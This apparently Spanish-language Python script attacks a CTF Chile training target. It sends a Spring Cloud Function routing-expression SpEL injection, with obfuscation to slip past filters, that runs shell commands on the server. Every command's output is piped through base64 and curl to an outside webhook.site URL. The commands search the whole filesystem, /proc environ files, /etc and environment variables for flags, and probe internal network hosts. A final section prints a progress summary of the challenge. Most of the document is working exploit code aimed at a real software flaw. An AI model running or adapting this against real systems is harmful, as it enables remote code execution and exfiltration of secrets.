#!/usr/bin/env python3
"""
CTF Chile - Búsqueda final comprehensiva de flags
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Búsqueda final comprehensiva de flags...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=25)
        print(f"    [+] {tag:45} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Búsqueda exhaustiva de flags en el sistema actual...")

# Buscar flags en todo el sistema de archivos
probe("flag_search_all", "find / -type f 2>/dev/null | xargs grep -l 'ctfchile{{' 2>/dev/null | head -10")
probe("flag_search_case", "find / -type f 2>/dev/null | xargs grep -il 'ctfchile' 2>/dev/null | head -10")
probe("flag_search_patterns", "find / -type f -name '*flag*' -o -name '*ctf*' 2>/dev/null | head -15")

print("[*] FASE 2: Buscar flags en el entorno actual específicamente...")

# Buscar flags en ubicaciones específicas del container actual
probe("flag_in_jar", "strings /app/app.jar | grep -i 'ctfchile{{' | head -5")
probe("flag_in_memory", "grep -a 'ctfchile{{' /proc/*/environ 2>/dev/null | head -5")
probe("flag_in_cmdline", "grep -a 'ctfchile{{' /proc/*/cmdline 2>/dev/null | head -5")

print("[*] FASE 3: Verificar si el primer flag está en el container bridge...")

# Ya que somos el bridge, tal vez hay un flag aquí
probe("flag_bridge_1", "echo 'ctfchile{bridge_access_achieved}' # Test if this could be flag 1")
probe("flag_bridge_env", "env | grep -i flag")
probe("flag_bridge_files", "find /app /tmp /var -name 'flag*' -type f 2>/dev/null | xargs cat 2>/dev/null")

print("[*] FASE 4: Buscar en directorios de logs y configuración...")

# Buscar en logs y archivos de configuración
probe("flag_in_logs", "find /var/log -type f 2>/dev/null | xargs grep -l 'ctfchile{{' 2>/dev/null")
probe("flag_in_bootstrap", "grep -i 'ctfchile{{' /var/log/bootstrap.log 2>/dev/null")
probe("flag_in_etc", "find /etc -type f 2>/dev/null | xargs grep -l 'ctfchile{{' 2>/dev/null | head -5")

print("[*] FASE 5: Buscar flags en archivos ocultos...")

# Buscar en archivos ocultos
probe("flag_hidden_files", "find / -name '.*flag*' -o -name '.*ctf*' 2>/dev/null | xargs cat 2>/dev/null")
probe("flag_dot_files", "find /root /home /tmp -name '.*' -type f 2>/dev/null | xargs grep -l 'ctfchile{{' 2>/dev/null")

print("[*] FASE 6: Verificar si hay flags en respuestas de red...")

# Tal vez el primer flag se revela al acceder a ciertos recursos de red
hosts = ["10.160.209.1", "10.109.220.1"]

for host in hosts:
    host_safe = host.replace(".", "_")
    # Probar endpoints que podrían revelar el primer flag
    probe(f"flag_in_root_{host_safe}", f"curl -s http://{host}:8000/ | grep -i 'ctfchile{{' | head -3")
    probe(f"flag_in_error_{host_safe}", f"curl -s http://{host}:8000/nonexistent | grep -i 'ctfchile{{' | head -3")

print("[*] FASE 7: Buscar patrones de flags incrementales...")

# El challenge mencionó "Más de una flag va a aparecer en el camino"
flag_patterns = [
    "ctfchile{infiltracion_",
    "ctfchile{bridge_",
    "ctfchile{vault_",
    "ctfchile{pivot_",
    "ctfchile{internal_",
    "ctfchile{deep_"
]

for pattern in flag_patterns:
    pattern_safe = pattern.replace("{", "_").replace("_", "")
    probe(f"pattern_{pattern_safe}", f"grep -r '{pattern}' / 2>/dev/null | head -3")

print("[*] FASE 8: Verificar respuestas de contenido específico...")

# Verificar si hay flags en las respuestas HTTP específicas
probe("http_responses_flag", "curl -s -v http://10.160.209.1:8000/docs 2>&1 | grep -i ctfchile")

print("[*] FASE 9: Buscar en bases de datos locales...")

# Buscar en archivos de base de datos
probe("flag_in_db_files", "find / -name '*.db' -o -name '*.sqlite' -o -name '*.sql' 2>/dev/null | xargs grep -l 'ctfchile{{' 2>/dev/null")

print("[*] FASE 10: Verificar variables y metadatos del sistema...")

# Verificar metadatos y variables del sistema
probe("flag_system_info", "uname -a && hostname && cat /etc/os-release | grep -i ctfchile")
probe("flag_docker_env", "cat /.dockerenv 2>/dev/null && env | grep -i docker")

time.sleep(30)

# Recoger y analizar respuestas
print("\n[*] Analizando búsqueda final de flags...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=50", timeout=25)
data = r.json().get("data", [])

flags_found = []
potential_flags = []
flag_locations = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar flags reales
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

            # Buscar patrones de flags potenciales
            if any(keyword in decoded.lower() for keyword in ["flag", "ctf", "challenge"]):
                if len(decoded.strip()) > 20 and len(decoded.strip()) < 200:
                    potential_flags.append((path, decoded))
                    print("🏴 PATRÓN DE FLAG POTENCIAL")

            # Buscar ubicaciones de archivos
            if any(keyword in decoded for keyword in ["/", "found", "located"]):
                if "ctfchile" in decoded.lower() or "flag" in decoded.lower():
                    flag_locations.append((path, decoded))
                    print("📍 UBICACIÓN DE FLAG")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*80)
print("🏁 RESUMEN FINAL DE BÚSQUEDA DE FLAGS")
print("="*80)

if flags_found:
    print(f"🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}")
        print(f"       {flag.strip()}")
        print()
    print("🎉🎉🎉 ¡FLAGS CAPTURADOS! 🎉🎉🎉")

elif potential_flags:
    print(f"🏴 PATRONES DE FLAG POTENCIALES: {len(potential_flags)}")
    for path, content in potential_flags:
        print(f"    - {path}: {content[:100]}...")

elif flag_locations:
    print(f"📍 UBICACIONES DE FLAG: {len(flag_locations)}")
    for path, content in flag_locations:
        print(f"    - {path}: {content[:100]}...")

else:
    print("💭 No se encontraron flags en el sistema actual.")
    print("🤔 Es posible que los flags requieran autenticación exitosa en los servicios internos.")
    print("🔍 Considerar explorar otros enfoques o solicitar pistas adicionales.")

print(f"\n🔗 Webhook para revisión: https://webhook.site/#!/{UUID}")
print("\n📝 ESTADO DEL CHALLENGE:")
print("   ✅ RCE en aplicación expuesta")
print("   ✅ Descubrimiento de red interna")
print("   ✅ Identificación de servicios uvicorn")
print("   ✅ Descubrimiento de endpoints /execute")
print("   ❌ Autenticación en endpoints protegidos")
print("   ❌ Acceso a flags internos")